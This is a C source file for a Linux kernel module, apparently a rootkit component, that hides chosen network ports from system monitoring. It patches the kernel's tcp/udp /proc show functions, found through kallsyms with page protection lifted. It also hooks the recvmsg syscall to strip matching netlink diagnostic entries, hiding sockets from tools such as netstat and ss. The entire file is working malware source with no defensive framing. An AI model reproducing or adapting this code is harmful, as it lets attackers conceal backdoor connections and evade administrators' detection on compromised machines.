#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <net/inet_sock.h>
#include <linux/seq_file.h>
#include <linux/rwlock.h>
#include <linux/inet_diag.h>

#include "socket_hiding.h"
#include "syscall_hooking.h"
#include "helper.h"

static int enabled = 0;

/*
 * Data structures for hidden sockets
 */
static DEFINE_RWLOCK(sockets_lock);
static LIST_HEAD(hidden_sockets);

struct hidden_socket {
    struct list_head list;
    unsigned short port;
};

/*
 * Hooking function pointers
 */

/*
 * recvmsg syscall
 */
static t_syscall orig_recvmsg = NULL;

/*
 * Sequence operations, for tcp and udp proc entries.
 * Holding pointers to 'show'
 */
static struct seq_operations *tcp_ops;
static struct seq_operations *tcp6_ops;
static struct seq_operations *udp_ops;
static struct seq_operations *udp6_ops;

/*
 * Original show methods
 */
typedef int (*t_seq_show) (struct seq_file *, void*);
static t_seq_show orig_tcp_seq_show = NULL;
static t_seq_show orig_tcp6_seq_show = NULL;
static t_seq_show orig_udp_seq_show = NULL;
static t_seq_show orig_udp6_seq_show = NULL;

/*
 * Check if socket is hidden
 *
 * Expects read lock
 */
static struct hidden_socket *is_hidden(unsigned short port) {

    struct hidden_socket *entry;

    list_for_each_entry(entry, &hidden_sockets, list) {
        if (entry->port == port) {
            return entry;
        }
    }
    return NULL;
}

static int is_hidden_safe(unsigned short port) {
    int ret = 0;

    read_lock(&sockets_lock);
    ret = is_hidden(port) != NULL;
    read_unlock(&sockets_lock);

    return ret;
}

#define MODE_UDP    0
#define MODE_UDP6   1
#define MODE_TCP    2
#define MODE_TCP6   3

/*
 * Filter hidden sockets, otherwise return original result
 */
static int hooked_show(struct seq_file *seq, void *v, int type) {

    struct inet_sock *inet;
    int res;

    if (SEQ_START_TOKEN != v) {

        /* filter */
        inet = inet_sk((struct sock *) v);

        read_lock(&sockets_lock);
        res = is_hidden(ntohs(inet->inet_sport)) != NULL;
        read_unlock(&sockets_lock);

        if (res)
            return 0;
    }

    switch (type) {
        case MODE_UDP:
            return orig_udp_seq_show(seq, v);
        case MODE_UDP6:
            return orig_udp6_seq_show(seq, v);
        case MODE_TCP:
            return orig_tcp_seq_show(seq, v);
        case MODE_TCP6:
            return orig_tcp6_seq_show(seq, v);
        default:
            return 0;
    }
}

static int hooked_tcp_show(struct seq_file *seq, void *v) {
    return hooked_show(seq, v, MODE_TCP);
}

static int hooked_tcp6_show(struct seq_file *seq, void *v) {
    return hooked_show(seq, v, MODE_TCP6);
}

static int hooked_udp_show(struct seq_file *seq, void *v) {
    return hooked_show(seq, v, MODE_UDP);
}

static int hooked_udp6_show(struct seq_file *seq, void *v) {
    return hooked_show(seq, v, MODE_UDP6);
}

/*
 * Recvmsg hook
 */
static asmlinkage long hooked_recvmsg(const struct pt_regs *pt_regs) {

    struct user_msghdr __user *msg;
    struct user_msghdr kmsg;
    struct iovec kmsg_iov;
    struct nlmsghdr *hdr;
    int offset, i;
    char *stream;
    ssize_t ret, count, orig_ret;
    void *base_buf = NULL;
    struct inet_diag_msg *data;
    unsigned short port;

    // Run the original recvmsg
    if (0 >= (ret = orig_recvmsg(pt_regs))) {
        return ret;
    }

    // Get the netlink msg from the user buffer into kernel space
    // We have to copy nested data
    msg = (struct user_msghdr __user *) pt_regs->si;
    if (0 != copy_from_user(&kmsg, msg, sizeof(*msg))) {
        return ret;
    }
    if (0 != copy_from_user(&kmsg_iov, kmsg.msg_iov, sizeof(*kmsg.msg_iov))) {
        return ret;
    }

    if (NULL == (base_buf = kmalloc(ret, GFP_KERNEL))) {
        return ret;
    }

    if (0 != copy_from_user(base_buf, kmsg_iov.iov_base, ret))
    {
        kfree(base_buf);
        return ret;
    }
    hdr = (struct nlmsghdr *) base_buf;

    // Iterate through all entries
    orig_ret = ret;
    count = ret; // at the beginning, count is equal to ret since we want to handle all bytes
    while(hdr != NULL && NLMSG_OK(hdr, count)) {

        if (hdr->nlmsg_type == NLMSG_DONE || hdr->nlmsg_type == NLMSG_ERROR) {
            // skip on errors
            kfree(base_buf);
            return ret;
        }

        // extract source port of the socket
        data = NLMSG_DATA(hdr);
        port = ntohs(data->id.idiag_sport);

        // check if socket is ipv4 or ipv6 and should be hidden
        if ((data->idiag_family == AF_INET || data->idiag_family == AF_INET6) && is_hidden_safe(port)) {
            // hide the entry by overwriting the entry by shifting the next messages left
            stream = (char *) hdr;
            offset = NLMSG_ALIGN(hdr->nlmsg_len);
            for (i = 0; i < count && i + offset < orig_ret; i++) {
                stream[i] = stream[i+offset];
            }
            // truncate the length
            ret -= offset;
            // decrease count by the offset and stay at the current hdr, which points to the next one due to the shift
            count -= offset; // required since count is not synchronized with ret anymore due to NLMSG_NEXT
        } else {
            // go to the next hdr
            hdr = NLMSG_NEXT(hdr, count); // caution: this decreases the count variable
        }
    }

    // Copy modified netlink msg back to user space
    if (0 != copy_to_user(kmsg_iov.iov_base, base_buf, orig_ret)) {
        kfree(base_buf);
        return ret;
    }
    kfree(base_buf);

    if (0 != copy_to_user(kmsg.msg_iov, &kmsg_iov, sizeof(*kmsg.msg_iov))) {
        return ret;
    }

    if (0 != copy_to_user(msg, &kmsg, sizeof(*msg))) {
        return ret;
    }

    return ret;
}

/*
 * Hide a socket
 */
int hide_socket(unsigned short port) {

    int ret = -1;
    struct hidden_socket *entry;

    if (enabled) {
        write_lock(&sockets_lock);

        /* check if already hidden */
        if (is_hidden(port) == NULL) {

            /* allocate new struct and insert data */
            if (NULL != (entry = kmalloc(sizeof(struct hidden_socket), GFP_KERNEL))) {
                entry->port = port;
                list_add_tail(&entry->list, &hidden_sockets);
                ret = 0;
            }
        }

        write_unlock(&sockets_lock);
    }

    return ret;
}

/*
 * Unhide a socket
 */
int unhide_socket(unsigned short port) {

    struct hidden_socket *entry;
    int ret = -1;

    if (enabled) {
        write_lock(&sockets_lock);

        /* Remove socket from list and free memory */
        if ((entry = is_hidden(port)) != NULL) {
            list_del(&entry->list);
            kfree(entry);
            ret = 0;
        }

        write_unlock(&sockets_lock);
    }

    return ret;
}

/*
 * Enable socket hiding
 */
int enable_socket_hiding(void) {

    unsigned long i;

    /*
     * get seq_operations for protocols via kallsyms
     */

    if (0 == (i = kallsyms_lookup_name("tcp4_seq_ops"))) {
        return -1;
    }
    tcp_ops = (struct seq_operations *) i;
    orig_tcp_seq_show = tcp_ops->show;

    if (0 == (i = kallsyms_lookup_name("tcp6_seq_ops"))) {
        return -1;
    }
    tcp6_ops = (struct seq_operations *) i;
    orig_tcp6_seq_show = tcp6_ops->show;

    if (0 == (i = kallsyms_lookup_name("udp_seq_ops"))) {
        return -1;
    }
    udp_ops = (struct seq_operations *) i;
    orig_udp_seq_show = udp_ops->show;

    if (0 == (i = kallsyms_lookup_name("udp6_seq_ops"))) {
        return -1;
    }
    udp6_ops = (struct seq_operations *) i;
    orig_udp6_seq_show = udp6_ops->show;

    /*
     * Hook show methods
     */
    unprotect_paging_mode();

    tcp_ops->show = hooked_tcp_show;
    tcp6_ops->show = hooked_tcp6_show;
    udp_ops->show = hooked_udp_show;
    udp6_ops->show = hooked_udp6_show;

    protect_paging_mode();

    /*
     * hook recvmsg syscall
     */
    orig_recvmsg = (t_syscall) get_original_syscall(__NR_recvmsg);
    add_syscall_hook(__NR_recvmsg, (unsigned long *) hooked_recvmsg);

    enabled = 1;
    return 0;
}

/*
 * Disable socket hiding
 */
void disable_socket_hiding(void) {

    struct hidden_socket *entry, *tmp;

    enabled = 0;

    /*
     * Unhook recvmsg
     */
    rm_syscall_hook(__NR_recvmsg);

    /*
     * Remove proc show hooks
     */
    unprotect_paging_mode();

    tcp_ops->show = orig_tcp_seq_show;
    tcp6_ops->show = orig_tcp6_seq_show;
    udp_ops->show = orig_udp_seq_show;
    udp6_ops->show = orig_udp6_seq_show;

    protect_paging_mode();

    /*
     * Remove all hidden sockets from list
     */
    write_lock(&sockets_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_sockets, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    write_unlock(&sockets_lock);
}